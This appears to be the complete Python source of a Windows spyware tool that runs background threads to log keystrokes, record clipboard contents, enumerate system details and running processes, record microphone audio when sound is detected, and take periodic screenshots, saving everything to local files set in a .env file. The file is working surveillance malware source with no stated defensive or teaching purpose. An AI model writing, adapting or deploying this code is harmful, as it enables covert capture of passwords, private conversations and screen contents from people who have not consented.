# Storing confidential info in .env file
from dotenv import load_dotenv
import os

#For tracking keystrokes
from pynput.keyboard import Key, Listener
import time
import string

# For capturing clipboard
import pyperclip

# For collecting computer info
import socket
import platform
import uuid
import wmi

# For capture audio
from scipy.io.wavfile import write
import sounddevice
import numpy
import wave

# For screenshot
from PIL import ImageGrab
import datetime

# For multithreading
import threading

load_dotenv()

def get_filename(filename):
    return os.path.normpath(os.environ.get("FILE_PATH") + "\\" + filename)

def keylog():
    keys = []
    last_time = time.time()
    pre_timestamp = 0

    def write_file(keys):
        nonlocal pre_timestamp
        with open(get_filename(os.environ.get("KEY_LOG_FILE")), "a") as f:
            for key, timestamp in keys:
                if f.tell() == 0 or timestamp - pre_timestamp >= 60:  # Check if the file is empty
                    f.write(f"=={time.strftime('%Y-%m-%d %H:%M:%S')}==\n")
                pre_timestamp = timestamp

                k = str(key).replace("'", "")
                if k.isalpha() or k in string.punctuation:
                    f.write(k)
                elif k == "Key.space":
                    f.write(" ")
                elif k == "Key.enter":
                    f.write(" [Enter]\n")
                elif "shift_" not in k:
                    f.write(f" [{k}] ")

    def on_press(key):
        nonlocal last_time
        timestamp = time.time()

        keys.append((key, timestamp))
        if len(keys) >= 10:  
            write_file(keys)
            keys.clear()

        last_time = timestamp

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

last_clipboard = None
def capture_clipboard():
    global last_clipboard
    while True:
        time.sleep(3)
        current_clipboard = pyperclip.paste()

        # If clipboard content changes, log it
        if current_clipboard and current_clipboard != last_clipboard:
            with open(get_filename(os.environ.get("CLIPBOARD_FILE")), "a") as f:
                try:
                    last_clipboard = current_clipboard
                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                    f.write(f"\n== {timestamp} ==\n{current_clipboard}\n")
                except:
                    f.write(f"Clipboard could not be copied\n")

# Common system processes to ignore
excluded_processes = [
                "svchost.exe", "winlogon.exe", "explorer.exe", "lsass.exe", "System Idle Process", "spoolsv.exe",
                "csrss.exe", "smss.exe", "wininit.exe", "services.exe", "Memory Compression", "WmiPrvSE.exe",
                "SecurityHealthService.exe", "dwm.exe", "ctfmon.exe", "SearchIndexer.exe", "RuntimeBroker.exe"
]
def get_computer_information():
    while True:
        with open(get_filename(os.environ.get("SYS_INFO_FILE")), "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            MACAddr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])

            system = platform.uname()

            f.write(f"System: {system.system}\n")
            f.write(f"Node Name: {system.node}\n")
            f.write(f"Release: {system.release}\n")
            f.write(f"Version: {system.version}\n")
            f.write(f"Machine: {system.machine}\n")
            f.write(f"Processor: {system.processor}\n")
            f.write(f"Private IP Address: {IPAddr}\n")
            f.write(f"MAC Address: {MACAddr}\n\n")

            f.write("PID\tProcess name\n")
            global excluded_processes
            
            try:
                processes = wmi.WMI()
                for process in processes.Win32_Process():
                    process_name = process.Name.lower()
                    if process_name not in excluded_processes and not process_name.startswith("system"):
                        f.write(f"{process.ProcessId:<10} {process.Name}\n\n")
            except wmi.x_wmi as e:
                f.write(f"WMI Query Failed: {e}\n")
        
        time.sleep(3600)

def capture_microphone(threshold):
    fs = 44100

    while True:
        audio = get_filename(f"audio_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.wav")
        buffer = []
        silence_start = None

        with sounddevice.InputStream(samplerate=fs, channels=2, dtype="int16") as stream:
            while True:
                audio_chunk, _ = stream.read(fs // 10)  # Read in small chunks (0.1s)
                buffer.append(audio_chunk)
                
                # Compute the volume level
                volume_level = numpy.mean(numpy.abs(audio_chunk))

                if volume_level >= threshold:
                    silence_start = None  # Reset silence detection
                elif silence_start is None:
                    silence_start = time.time()  # Mark start of silence
                elif time.time() - silence_start >= 4:
                    break  # Stop recording if silence lasts for 'silence_duration' seconds

        if buffer:
            with wave.open(audio, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(b''.join(buffer))
        
        time.sleep(2)

def capture_screenshot():
    while True:
        screenshot = get_filename(f"screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        im = ImageGrab.grab(all_screens=True)
        im.save(screenshot)
        time.sleep(1800)

threading.Thread(target=keylog, daemon=True).start()
threading.Thread(target=capture_clipboard, daemon=True).start()
threading.Thread(target=get_computer_information, daemon=True).start()
threading.Thread(target=capture_microphone, args=(1000,), daemon=True).start()
threading.Thread(target=capture_screenshot, daemon=True).start()

# Keep the script running indefinitely
while True:
    time.sleep(1)